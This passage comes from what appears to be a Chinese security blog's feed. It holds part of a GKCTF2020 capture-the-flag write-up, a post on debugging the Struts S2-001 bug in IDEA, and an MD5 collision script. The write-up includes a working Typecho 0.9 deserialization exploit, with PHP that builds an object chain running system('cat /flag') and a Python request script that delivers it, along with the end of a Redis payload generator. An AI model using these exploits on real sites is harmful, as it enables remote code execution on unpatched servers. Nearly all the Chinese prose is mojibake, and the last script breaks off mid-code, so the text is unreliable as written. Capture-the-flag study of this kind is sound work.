<span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.request.quote(redis_format(x))</span><br><span class="line">    print(payload)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525130359211.png" alt="image-20200525130359211"></p>
<p>æ¥ç€æµ‹è¯•webshell</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525130438217.png" alt="image-20200525130438217"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525131721234.png" alt="image-20200525131721234"></p>
<h3 id="5-EZä¸‰å‰‘å®¢-EzTypecho"><a href="#5-EZä¸‰å‰‘å®¢-EzTypecho" class="headerlink" title="5.EZä¸‰å‰‘å®¢-EzTypecho"></a>5.EZä¸‰å‰‘å®¢-EzTypecho</h3><p>æ‹¿åˆ°é¢˜ç›®æºç åå‘ç°æ˜¯0.9ç‰ˆæœ¬ï¼Œå…ˆå»githubä¸‹äº†ä¸ª0.9ç‰ˆæœ¬ï¼Œç„¶åç”¨å¯¹æ¯”å·¥å…·æ¯”è¾ƒinstall.php</p>
<p>å‘ç°<code>session_start();</code>è¢«æ³¨é‡Š</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525135740889.png" alt="image-20200525135740889"></p>
<p>å…³é”®ä»£ç </p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525140208760.png" alt="image-20200525140208760"></p>
<p>é¦–å…ˆè¦ååºåˆ—åŒ–å°±è¦SESSIONï¼Œä½†<code>session_start();</code>è¢«æ³¨é‡Šï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•ç»•è¿‡</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525140624669.png" alt="image-20200525140624669"></p>
<p><a href="https://www.freebuf.com/vuls/155753.html" target="_blank" rel="noopener">Typechoååºåˆ—åŒ–çš„æ–‡ç« </a></p>
<p>poc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$CMD = <span class="string">'system("cat /flag")'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">    <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//$this-&gt;_type = $this::RSS2;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::ATOM1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = $GLOBALS[CMD];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">    <span class="string">'prefix'</span>  =&gt; <span class="string">'typecho_'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://97caa567-ba9d-4f95-825b-14bebe796a6e.node3.buuoj.cn/install.php?finish=1'</span></span><br><span class="line">files=&#123;<span class="string">'file'</span>:<span class="number">123</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">'cookie'</span>:<span class="string">'PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOToic3lzdGVtKCJjYXQgL2ZsYWciKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjE5OiJzeXN0ZW0oImNhdCAvZmxhZyIpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ=='</span>,</span><br><span class="line"> <span class="string">'Referer'</span>:<span class="string">'http://97caa567-ba9d-4f95-825b-14bebe796a6e.node3.buuoj.cn/install.php'</span>&#125;</span><br><span class="line">re=requests.post(url,files=files,headers=headers,data=&#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>: <span class="string">"123456789"</span>&#125;)</span><br><span class="line">print(re.text)</span><br></pre></td></tr></table></figure>

<h3 id="6-EZä¸‰å‰‘å®¢-EzNode"><a href="#6-EZä¸‰å‰‘å®¢-EzNode" class="headerlink" title="6.EZä¸‰å‰‘å®¢-EzNode"></a>6.EZä¸‰å‰‘å®¢-EzNode</h3><p>é¦–å…ˆçœ‹æºç ï¼Œå‘ç°delayè¢«è®¾ç½®çš„å¾ˆå¤§ï¼Œæ‰§è¡Œå‘½ä»¤ä¼šè¶…æ—¶ï¼Œåœ¨node.js<a href="http://nodejs.cn/api/timers.html#timers_settimeout_callback_delay_args" target="_blank" rel="noopener">æ–‡æ¡£ä¸­</a>æŒ‡å‡º <code>å½“</code>delay<code>å¤§äº</code>2147483647<code>æˆ–å°äº</code>1<code>æ—¶ï¼Œåˆ™</code>delay<code>å°†ä¼šè¢«è®¾ç½®ä¸º</code>1<code>ã€‚ éæ•´æ•°çš„ delay ä¼šè¢«æˆªæ–­ä¸ºæ•´æ•°</code></p>
<p>ç„¶åé¢˜ç›®å¾ˆå¥‡æ€ªç»™äº†åŒ…çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯ æœ‰å…¬å¼€æ¼æ´</p>
<p>åœ¨<a href="https://github.com/advisories" target="_blank" rel="noopener">github advisories</a>æ‰¾åˆ°äº†æ¼æ´ä¿¡æ¯</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525151514661.png" alt="image-20200525151514661"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-Pokemon"><a href="#1-Pokemon" class="headerlink" title="1. PokÃ©mon"></a>1. PokÃ©mon</h3><p>GBAæ¸¸æˆï¼Œç›´æ¥å»103å·é“è·¯ï¼Œé“è·¯ä¸Šå°±æ˜¯flag</p>
<h3 id="2-Harley-Quinn"><a href="#2-Harley-Quinn" class="headerlink" title="2.Harley Quinn"></a>2.Harley Quinn</h3><p>é¢˜ç›®ä¿¡æ¯éšè—çš„æŒºç»†è‡´çš„ï¼Œå¯¼è‡´ä¸€ç›´æ‡µé€¼ã€‚</p>
<p>å…ˆæ˜¯å‹ç¼©åŒ…çš„å±æ€§é‡Œæœ‰è§£å¯†çš„ä¿¡æ¯</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105114519.png" alt="image-20200526105114519"></p>
<p>ç„¶åæ ¹æ®é¢˜ç›®æè¿°ä¸‹è½½Free_File_Camouflage V1.25</p>
<p>è§£å‹åï¼Œæœ‰ä¸ªwavéŸ³é¢‘æ–‡ä»¶ï¼Œå±æ€§é‡Œä¹Ÿæœ‰ä¿¡æ¯</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105632498.png" alt="image-20200526105632498"></p>
<p>æç¤ºå¯†ç æœ‰21ä½</p>
<p>éŸ³é¢‘ç”¨Sonic Visualiseræ‰“å¼€åå‘ç°æœ«å°¾æœ‰æ’­éŸ³å· å¯ä»¥è‡ªå·±æ‰‹åŠ¨è§£ï¼Œæˆ–è€…ç”¨</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105730727.png" alt="image-20200526105730727"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526113701783.png" alt="image-20200526113701783"></p>
<p>æ¥ç€ç”¨ä¹å®«æ ¼å¯†ç è§£</p>
<p>222æŒ‰3ä¸‹2é”®å°±æ˜¯cï¼Œåé¢åŒç†</p>
<p><img src="/2020/05/GKCTF2020-Writeup/clip_image001.png" alt="img"></p>
<p>æœ€åè§£å‡º <code>ctfisfun</code></p>
<p>ç„¶åç”¨ç„¶åç”¨è½¯ä»¶</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526155704949.png" alt="image-20200526155704949"></p>
<h3 id="3-code-obfuscation"><a href="#3-code-obfuscation" class="headerlink" title="3.code obfuscation"></a>3.code obfuscation</h3><p>é™„ä»¶æ˜¯ä¸ªæ‰­æ›²çš„äºŒç»´ç </p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161615952.png" alt="image-20200526161615952"></p>
<p>ç„¶åbinwalkeå¯ä»¥åˆ†è§£å‡ºä¸ªè¦å¯†ç å‹ç¼©åŒ…</p>
<p>æ¥ç€ä¿®å›¾ï¼Œpsæ‰“å¼€å›¾ç‰‡,é€‰å®šå¥½éœ€è¦å˜æ¢çš„åŒºåŸŸï¼Œå³é”®è‡ªç”±å˜æ¢åå†æ‰­æ›²ï¼Œç„¶åæˆªå–ä¸‹æ¥</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161626648.png" alt="image-20200526161626648"></p>
<p>æ¥ç€matlabå¤„ç†</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161717329.png" alt="image-20200526161717329"></p>
<p>æ‰«å‡ºæ¥ <code>base(gkctf)</code></p>
<p>è¯•äº†ä¸‹è§£ä¸äº†ï¼Œå¯èƒ½è¦baseXXç¼–ç ã€‚ç„¶åç”¨base58è§£å‡ºæ¥äº†</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526163147548.png" alt="image-20200526163147548"></p>
<p>è§£å‹åå¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶ä¸€ä¸ªæ˜¯jsä»£ç ï¼Œä¸€ä¸ªæ˜¯å¯†æ–‡</p>
<p>jsä»£ç ç»è¿‡ æ··æ·†ï¼Œåˆ©ç”¨<a href="http://tool.chinaz.com/js.aspx" target="_blank" rel="noopener">åœ¨çº¿å·¥å…·</a>è§£å¯†åå¾—åˆ°è§£å¯†åçš„jsä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j k l m n o p q r s t u v w x y z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j <span class="keyword">do</span> <span class="built_in">eval</span> Bn = <span class="string">"n"</span></span><br><span class="line">    num =</span><br><span class="line">    $((num + <span class="number">1</span>)) done alert(<span class="string">"Bk=' ';Bm='"</span></span><br><span class="line">        ';Bn='#</span><br><span class="line">        <span class="string">';Bs='</span> (<span class="string">';Bt='</span>)</span><br><span class="line">        <span class="string">';By='</span>.</span><br><span class="line">        <span class="string">';Cb='</span>;</span><br><span class="line">        <span class="string">';Cc='</span> &lt; <span class="string">';Ce='</span> &gt; <span class="string">';Cl='</span></span><br><span class="line">        _ <span class="string">';Cn='</span> &#123;</span><br><span class="line">            <span class="string">';Cp='</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">';Da='</span></span><br><span class="line">        <span class="number">0</span> <span class="string">';Db='</span></span><br><span class="line">        <span class="number">1</span> <span class="string">';Dc='</span></span><br><span class="line">        <span class="number">2</span> <span class="string">';Dd='</span></span><br><span class="line">        <span class="number">3</span> <span class="string">';De='</span></span><br><span class="line">        <span class="number">4</span> <span class="string">';Df='</span></span><br><span class="line">        <span class="number">5</span> <span class="string">';Dg='</span></span><br><span class="line">        <span class="number">6</span> <span class="string">';Dh='</span></span><br><span class="line">        <span class="number">7</span> <span class="string">';Di='</span></span><br><span class="line">        <span class="number">8</span> <span class="string">';Dj='</span></span><br><span class="line">        <span class="number">9</span> <span class="string">';")</span></span><br></pre></td></tr></table></figure>

<p>è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="string">"Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp"</span></span><br><span class="line"></span><br><span class="line">c = &#123;<span class="string">"Bk"</span>: <span class="string">' '</span>, <span class="string">"Bm"</span>: <span class="string">'"'</span>, <span class="string">"Bn"</span>: <span class="string">'#'</span>, <span class="string">"Bs"</span>: <span class="string">'('</span>, <span class="string">"Bt"</span>: <span class="string">')'</span>, <span class="string">"By"</span>: <span class="string">'.'</span>, <span class="string">"Cb"</span>: <span class="string">','</span>, <span class="string">"Cc"</span>: <span class="string">'&lt;'</span>, <span class="string">"Ce"</span>: <span class="string">'&gt;'</span>, <span class="string">"Cl"</span>: <span class="string">'_'</span>,</span><br><span class="line">     <span class="string">"Cn"</span>: <span class="string">'&#123;'</span>, <span class="string">"Cp"</span>: <span class="string">'&#125;'</span>, <span class="string">"Da"</span>: <span class="string">'0'</span>, <span class="string">"Db"</span>: <span class="string">'1'</span>, <span class="string">"Dc"</span>: <span class="string">'2'</span>, <span class="string">"Dd"</span>: <span class="string">'3'</span>, <span class="string">"De"</span>: <span class="string">'4'</span>, <span class="string">"Df"</span>: <span class="string">'5'</span>, <span class="string">"Dg"</span>: <span class="string">'6'</span>, <span class="string">"Dh"</span>: <span class="string">'7'</span>,</span><br><span class="line">     <span class="string">"Di"</span>: <span class="string">'8'</span>, <span class="string">"Dj"</span>: <span class="string">'9'</span>&#125;</span><br><span class="line">f = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b.split(<span class="string">'$'</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> c.keys():</span><br><span class="line">        f = f + c[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = f + i[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure>

<h3 id="4-Sail-a-boat-down-the-river"><a href="#4-Sail-a-boat-down-the-river" class="headerlink" title="4.Sail a boat down the river"></a>4.Sail a boat down the river</h3><p>ç›´æ¥ç”¨å‘½ä»¤åˆ†è§£è§†é¢‘</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526165220148.png" alt="image-20200526165220148"></p>
<p>ç„¶åä»118å¸§å¼€å§‹è§‚å¯Ÿäº®ç‚¹ï¼ŒçŸ­æ˜¯1å¸§ï¼Œé•¿æ˜¯3å¸§</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526165724934.png" alt="image-20200526165724934"></p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="literal">-</span><span class="string">.</span>--<span class="comment">/</span><span class="string">.</span>--<span class="comment">/</span>--<span class="literal">-</span><span class="string">.</span><span class="string">.</span><span class="comment">/</span>--<span class="string">.</span><span class="comment">/</span></span><br></pre></td></tr></table></figure>

<p>æ‘©æ–¯è§£ç </p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526170554507.png" alt="image-20200526170554507"></p>
<p>ç¬¬465å¸§æœ‰ä¸ªäºŒç»´ç ï¼Œæ‰«ç æ˜¯ä¸ªç™¾åº¦ç›˜é“¾æ¥</p>
<p>æ‰“å¼€ï¼Œæå–ç YW8G</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526170728445.png" alt="image-20200526170728445"></p>
<p>ç„¶åç©æ•°ç‹¬ï¼Œæ ¹æ®æç¤ºå¾—åˆ°å¯†é’¥</p>
<p><code>52693795149137</code></p>
<p>åŠ å¯†æ˜¯AES(hex)ï¼Œå‘ç‚¹æ˜¯å­—ç¬¦é›† <code>gb18030/ISO10126</code></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200526172054944.png" alt="image-20200526172054944"></p>
<p>è§£å¼€å‹ç¼©åŒ…ï¼Œå¾—åˆ° <code>é€†å…‰vocal.ovex</code>ç”¨æ‰“è°±è½¯ä»¶æ‰“å¼€å°±æœ‰flagã€‚çœŸå¿ƒæƒ³ä¸åˆ°</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEAè¿œç¨‹è°ƒè¯•JAR</title>
    <url>/2021/09/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95JAR/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="IDEAè¿œç¨‹è°ƒè¯•JAR"><a href="#IDEAè¿œç¨‹è°ƒè¯•JAR" class="headerlink" title="IDEAè¿œç¨‹è°ƒè¯•JAR"></a>IDEAè¿œç¨‹è°ƒè¯•JAR</h1><p>æœ€è¿‘æŠŠstrutsçš„ç›¸å…³æ´è·Ÿäº†ä¸€éï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹IDEAçš„è°ƒè¯•ç¯å¢ƒçš„é…ç½®ã€‚</p><h2 id="IDEAå®‰è£…åç¼–è¯‘æ’ä»¶"><a href="#IDEAå®‰è£…åç¼–è¯‘æ’ä»¶" class="headerlink" title="IDEAå®‰è£…åç¼–è¯‘æ’ä»¶"></a>IDEAå®‰è£…åç¼–è¯‘æ’ä»¶</h2><p>å¯¹äºjaråŒ…ä¸­çš„classæ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦åç¼–è¯‘æ‰èƒ½çœ‹åˆ°æºç è°ƒè¯•ã€‚</p><p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/image-20210908172825269.png" alt="image-20210908172825269"></p><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p>ä»¥è°ƒè¯•S2-001ä¸ºä¾‹</p><p>ç¯å¢ƒä½¿ç”¨<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p><h3 id="tomcatå¼€å¯debugæ¨¡å¼"><a href="#tomcatå¼€å¯debugæ¨¡å¼" class="headerlink" title="tomcatå¼€å¯debugæ¨¡å¼"></a>tomcatå¼€å¯debugæ¨¡å¼</h3><a id="more"></a>




<p>ä¿®æ”¹catalina.shæ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼Œè°ƒè¯•ç«¯å£æ˜¯8081</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">JAVA_OPTS</span>=<span class="string">"-agentlib:jdwp=transport=dt_socket,address=8081,server=y,suspend=n"</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/image-20210909091427403.png" alt="image-20210909091427403"></p>
<h3 id="ä¿®æ”¹docker-compose-yml"><a href="#ä¿®æ”¹docker-compose-yml" class="headerlink" title="ä¿®æ”¹docker-compose.yml"></a>ä¿®æ”¹docker-compose.yml</h3><p>å› ä¸ºé™¤äº†æ­£å¸¸çš„webç«¯å£ï¼Œè¿˜æœ‰ä¸€ä¸ªdebugç«¯å£éœ€è¦æ˜ å°„</p>
<p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/image-20210909091614647.png" alt="image-20210909091614647"></p>
<h3 id="ä¿®æ”¹Dockerfile"><a href="#ä¿®æ”¹Dockerfile" class="headerlink" title="ä¿®æ”¹Dockerfile"></a>ä¿®æ”¹Dockerfile</h3><p>éœ€è¦æŠŠä¿®æ”¹åçš„<code>catalina.sh</code>æ›¿æ¢åŸæ¥çš„</p>
<p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/image-20210909091713142.png" alt="image-20210909091713142"></p>
<h3 id="è¿è¡Œå®¹å™¨"><a href="#è¿è¡Œå®¹å™¨" class="headerlink" title="è¿è¡Œå®¹å™¨"></a>è¿è¡Œå®¹å™¨</h3><p>å¦‚æœä¹‹å‰èµ·è¿‡å®¹å™¨éœ€è¦é‡æ–°buildï¼Œæ›´æ–°imageæ–‡ä»¶</p>
<p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/image-20210909092020998.png" alt="image-20210909092020998"></p>
<h3 id="IDEAé…ç½®"><a href="#IDEAé…ç½®" class="headerlink" title="IDEAé…ç½®"></a>IDEAé…ç½®</h3><p>æŠŠé¡¹ç›®ä¸­çš„ S2-001.warä¸‹è½½åˆ°æœ¬åœ°ï¼Œè§£å‹åä½¿ç”¨IDEAä½œä¸ºé¡¹ç›®æ‰“å¼€ã€‚</p>
<p>å³é”®lib-&gt;æ·»åŠ ä¸ºåº“</p>
<p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/image-20210909092541288.png" alt="image-20210909092541288"></p>
<p>æ–‡ä»¶- &gt;é¡¹ç›®ç»“æ„ è®¾ç½®é¡¹ç›®SDK</p>
<p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/image-20210909092729175.png" alt="image-20210909092729175"></p>
<p>å³ä¸Šè§’æ·»åŠ è¿è¡Œé…ç½®</p>
<p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/image-20210909092920216.png" alt="image-20210909092920216"></p>
<p>ç›‘å¬debugï¼Œä¸‹å¥½æ–­ç‚¹ï¼Œè®¿é—®è§¦å‘</p>
<p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/image-20210909093059050.png" alt="image-20210909093059050"></p>
<h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><h3 id="æ— æ³•è¯„ä¼°è¡¨è¾¾å¼"><a href="#æ— æ³•è¯„ä¼°è¡¨è¾¾å¼" class="headerlink" title="æ— æ³•è¯„ä¼°è¡¨è¾¾å¼"></a>æ— æ³•è¯„ä¼°è¡¨è¾¾å¼</h3><p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/Image.png" alt="Image"></p>
<p>å’ŒIDEAçš„è‡ªåŠ¨å¯¼å…¥æœ‰å…³</p>
<p>æ’é™¤ç›¸å…³ç±»çš„è‡ªåŠ¨å¯¼å…¥</p>
<p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/image-20210909093454410.png" alt="image-20210909093454410"></p>
<p><img src="/2021/09/IDEAè¿œç¨‹è°ƒè¯•JAR/Image-1631151331481.png" alt="Image"></p>
]]></content>
      <categories>
        <category>ç¯å¢ƒæ­å»º</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
        <tag>è°ƒè¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>MD5Crack</title>
    <url>/2019/11/Md5Crack/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ç®€å•ç¢°æ’è„šæœ¬"><a href="#ç®€å•ç¢°æ’è„šæœ¬" class="headerlink" title="ç®€å•ç¢°æ’è„šæœ¬"></a>ç®€å•ç¢°æ’è„šæœ¬</h2><p>ä¸€ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span> ,<span class="number">1000000</span>):</span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(str(i))</span><br><span class="line">    s=md.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (s[<span class="number">0</span>:<span class="number">7</span>] == <span class="string">"721e123"</span>):</span><br><span class="line">        print(str(i))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><a id="more"></a>


<p>äºŒ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ä½¿ç”¨æ–¹æ³•ï¼špython md5Crack.py "ä½ è¦ç¢°æ’çš„å­—ç¬¦ä¸²" å­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®</span></span><br><span class="line"><span class="string">ä¾‹å¦‚ï¼špython md5Crack.py â€œ0e" 0</span></span><br><span class="line"><span class="string">å°†äº§ç”ŸMD5å€¼ä¸º0eå¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.letters + string.digits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmp_md5</span><span class="params">(substr, stop_event, str_len,start=<span class="number">0</span>, size=<span class="number">20</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">''</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> range(size))</span><br><span class="line">        md51 = hashlib.md5(rnds)</span><br><span class="line">        value1 = md51.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value1[start: start+str_len] == substr:</span><br><span class="line"></span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            #ç¢°æ’å•MD5</span></span><br><span class="line"><span class="string">            print rnds</span></span><br><span class="line"><span class="string">            stop_event.set()</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            #ç¢°æ’åŒmd5</span></span><br><span class="line"><span class="string">            md52 = hashlib.md5(value1)</span></span><br><span class="line"><span class="string">            if md52.hexdigest()[start: start+str_len] == substr:</span></span><br><span class="line"><span class="string">            	print rnds+ "=&gt;" + value1+"=&gt;"+ md52.hexdigest()  + "\n"</span></span><br><span class="line"><span class="string">                stop_event.set()</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># ç¢°æ’ä¸‰MD5</span></span><br><span class="line">            md52 = hashlib.md5(value1)</span><br><span class="line">            value2 = md52.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> value2[start: start + str_len] == substr:</span><br><span class="line">                md53 = hashlib.md5(value2)</span><br><span class="line">                <span class="keyword">if</span> md53.hexdigest()[start: start + str_len] == substr:</span><br><span class="line">                    <span class="keyword">print</span> rnds + <span class="string">"=&gt;"</span> + value1 + <span class="string">"=&gt;"</span> +value2+<span class="string">"=&gt;"</span>+ md53.hexdigest() + <span class="string">"\n"</span></span><br><span class="line">                    